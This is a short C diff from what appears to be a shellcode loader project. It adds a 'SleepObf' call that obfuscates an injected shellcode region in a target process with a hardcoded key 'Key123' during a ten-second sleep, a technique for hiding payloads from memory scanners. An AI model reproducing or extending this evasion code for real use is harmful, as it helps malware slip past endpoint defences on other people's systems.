@@ -116,7 +116,24 @@ int main() {
     	&memoryShellcodeAlloc
     )) {
     	DEBUG_ERROR("FAILED ThreadNameAlloc");
-    	return FALSE;
+    	return -1;
+    }
+
+    UNICODE_STRING key;
+    RtlInitUnicodeString(
+        &key,
+        L"Key123"
+    );
+
+    if (!SleepObf(
+        hProcess,
+        memoryShellcodeAlloc.executionAddr,
+        shellcodeSize,
+        1000 * 10,
+        key
+    )) {
+        DEBUG_ERROR("FAILED SleepObf");
+        return -1;
     }
 
     DEBUG_INFO("Execution Addr @ 0x%p", memoryShellcodeAlloc.executionAddr);
